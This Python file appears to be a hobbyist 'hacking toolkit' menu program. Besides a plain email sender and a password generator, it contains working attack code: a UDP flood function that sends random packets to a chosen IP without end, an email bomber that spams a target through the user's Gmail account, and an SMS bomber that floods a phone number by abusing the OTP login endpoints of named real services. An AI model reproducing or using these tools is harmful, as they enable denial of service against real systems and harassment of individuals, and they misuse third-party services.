# root run variable == ß

import add_ons
from add_ons import *
import datetime
import os
from os import *
import os.path
import random
from random import shuffle
import requests
import smtplib
from add_ons import launcher
import socket
import string
import time
import pathlib
from pathlib import *

mods = ('sys', 'datetime', 'time', 'smtplib', 'socket', 'random')
Imp_mods = ('os', 'platform', 'sys', 'numpy', 'time', 'smtplib', 'socket', 'random')
imports = Imp_mods


def TR(arg):
    time.sleep(arg)


global NL
NL = print('\n' * 30)


############################ //modules || needed information \\ ############################

class mod:
    def send_mail(your_email, pwd, recipient, SUBJECT, TEXT):
        TO = recipient if isinstance(recipient, list) else [recipient]
        # Prepare actual message
        message = """From: %s\nTo: %s\nSubject: %s\n\n%s
        """ % (your_email, ", ".join(TO), SUBJECT, TEXT)

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(your_email, pwd)
            server.sendmail(your_email, TO, message)
            server.close()
            print('\n' * 30)
            print(f'successfully sent the mail\n')
            time.sleep(2)
            go_mod()

        except:
            print(f"failed to send mail \n")

    def ddos(targetipaddress, targetportnumber):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        trafficsent = 0
        while True:
            sock.sendto(bytes, (targetipaddress, targetportnumber))
            trafficsent = trafficsent + 1
            time.sleep(0.0002)
            print(f"Successfully {trafficsent} harm traffics sent to {targetipaddress}")
            if targetportnumber == 65534:
                targetportnumber = 1

    def passwordgenerate(passwordlenght):
        adduppercase = string.ascii_uppercase
        addlowercase = string.ascii_lowercase
        adddigits = string.digits
        addpunctuation = string.punctuation
        adduppercaseandlowercase = adduppercase + addlowercase
        uppercaseandlowercaselist = []

        for upperandlower in adduppercaseandlowercase:
            uppercaseandlowercaselist.append(upperandlower)
        random.shuffle(uppercaseandlowercaselist)
        uppercaseandlowercasejoined = "".join(uppercaseandlowercaselist[:500])
        digitslist = []

        for digits in adddigits:
            digitslist.append(digits)
        random.shuffle(digitslist)
        digitsjoined = "".join(digitslist[:500])
        punctuationlist = []

        for punctuation in addpunctuation:
            punctuationlist.append(punctuation)
        random.shuffle(punctuationlist)
        punctuationjoined = "".join(punctuationlist[:500])
        addall = uppercaseandlowercasejoined + digitsjoined + punctuationjoined
        passwordlist = []

        for passwords in addall:
            passwordlist.append(passwords)
        random.shuffle(passwordlist)
        passwordsjoined = "".join(passwordlist[:passwordlenght])
        print(f"Your Password: {passwordsjoined}")

    def emailbombing(attackeremailaddress, attackerpassword, targetemailaddress, attackermessage, numberofemails):
        print('please confirm:')
        time.sleep(2)
        print(f'Target: {targetemailaddress}')
        print(f'sender: {attackeremailaddress}')
        print(f'This is the mail to be sent')
        print(f'message == {attackermessage}')
        print(f'This is how many emails are going to be spammed: {numberofemails}')

        print('Continue with mail?')
        charlie = input('>>>')
        if charlie == 'y' or 'Y' or 'yes' or 'Yes':
            pass
        else:
            print('Aborting mail now')

        emailserver = smtplib.SMTP("smtp.gmail.com", 587)
        emailserver.starttls()
        emailserver.login(attackeremailaddress, attackerpassword)
        sentemail = 1
        while sentemail <= numberofemails:
            emailserver.sendmail(attackeremailaddress, targetemailaddress, attackermessage)
            print(f"Successfully {sentemail} email sent to {targetemailaddress}")
            sentemail = sentemail + 1
        emailserver.quit()

    def numberbombing(targetnumber, numberofsms):
        sentsms = 1
        if len(targetnumber) == 11:
            while sentsms <= numberofsms:
                try:
                    if "014" in targetnumber or "019" in targetnumber:
                        r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",
                                          data={"mobile": targetnumber})
                    else:
                        url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88" + targetnumber + "&operator=bd-otp"
                        r = requests.get(url)
                        print(f"Successfully {sentsms} SMS sent to {targetnumber}")
                        sentsms = sentsms + 1
                except:
                    print("Sorry, no SMS was sent")
        else:
            print("The number you entered is incorrect")

def go_mod():
    print(

        f'''
        		Modules
    |-------------------------------|
    | 1:: send email                |
    | ------------------------------|
    | 2:: ddos                      |
    |-------------------------------|
    | 3:: password genorator        |
    |-------------------------------|
    | 4:: email bomber              |
    |-------------------------------|
    | 5:: phone # bombing           |
    |-------------------------------|
    ''')

    print(
            '''---------_______ADD-ONS________--------------''')
    if TAN is not None:
        for word in TAN:
            try:
                TAN1 = (f'add_ons.{word}.men()')
                exec(TAN1)
            except:
                pass
    else:
        print("        No add-ons found!")

    choice = (input('Number>>> '))
    time.sleep(0.5)
    print('\n' * 30)
    modual_portal(choice)

def modual_portal(choice):
    try:
        if choice == '1':
            cr = 'send_mail'
            c = (f'modules>{cr}>')

            your_email = input(f'{c}Your email address: ')
            pwd = input(f'{c}Your password (not saved) : ')
            recipient = input(f"{c}Recipient's email address: ")
            SUBJECT = input(f'{c}What is the subject of the email: ')
            TEXT = input(f'{c}Write the body of your email here: ')

            mod.send_mail(your_email, pwd, recipient, SUBJECT, TEXT)
            time.sleep(2)
            print('\n' * 30)
            choice = None

            go_mod()

        elif choice == '2':
            cr = 'ddos'
            c = (f'modules>{cr}>')

            targetipaddress = input(f"{c}Enter Target IP Address: ")
            targetportnumber = int(input(f"{c}Enter Target Port Number: "))

            mod.ddos(targetipaddress, targetportnumber)
            time.sleep(2)
            print('\n' * 30)
            choice = None

            go_mod()

        elif choice == '3':
            cr = 'password_gen'
            c = (f'modules>{cr}>')

            passwordlenght = int(input(f"{c}Enter Password Lenght: "))

            mod.passwordgenerate(passwordlenght)
            time.sleep(2)
            print('\n' * 30)
            choice = None

            go_mod()

        elif choice == '4':
            cr = 'email_bombing'
            c = (f'modules>{cr}>')

            attackeremailaddress = input(f"{c}Enter Your Gmail Address: ")
            attackerpassword = input(f"{c}Enter Your Gmail Address Password: ")
            targetemailaddress = input(f"{c}Enter Target Email Address: ")
            attackermessage = input(f"{c}Attacker Message: ")
            numberofemails = int(input(f"{c}Number Of Emails: "))

            mod.emailbombing(attackeremailaddress, attackerpassword, targetemailaddress, attackermessage, numberofemails)
            time.sleep(2)
            print('\n' * 30)
            choice = None

            go_mod()

        elif choice == '5':
            cr = 'Phone_#_bombing'
            c = (f'modules>{cr}>')

            targetnumber = input(f"{c}Enter Target Number: ")
            numberofsms = int(input(f"{c}Number Of SMSs to be sent: "))

            mod.numberbombing(targetnumber, numberofsms)
            time.sleep(2)
            print('\n' * 30)
            choice = None

            go_mod()

        else:
            launcher.choice_check(choice)
            print(f'error- module {choice} does not exist, or is not available')
            time.sleep(2)
            print('\n' * 30)
            choice = None
            go_mod()

    except:
        time.sleep(1)
        print('a fatal error occured, module may be damaged. please try again later, or expect the developer to release a patch.')
        time.sleep(2)
        print(f'\n' * 30)
        choice = None
        go_mod()

def import_test(imports):
    modules = []
    for x in imports:
        try:
            modules.append(__import__(x))
            print("Successfully imported ", x, '.')
        except ImportError:
            print("Error importing ", x, '.')

global TAN
TAN = []

def val_check(modules):
    TAN.append(modules)

def _ø_(A, B, C):
    print(f'your operating system: {A}:{B}:{C}')
    print(f'date : {datetime.datetime.now()} ')

    print('Check modules-- Y/N')
    delta = input('>>> ')

    if delta == 'Y':
        modules = imports
        import_test(imports)

    else:
        print(f'You answered {delta}')
        time.sleep(0.5)
        print('Proceeding without module verification')

    time.sleep(0.1)
    print('\n' * 50)
    time.sleep(0.5)

    go_mod()
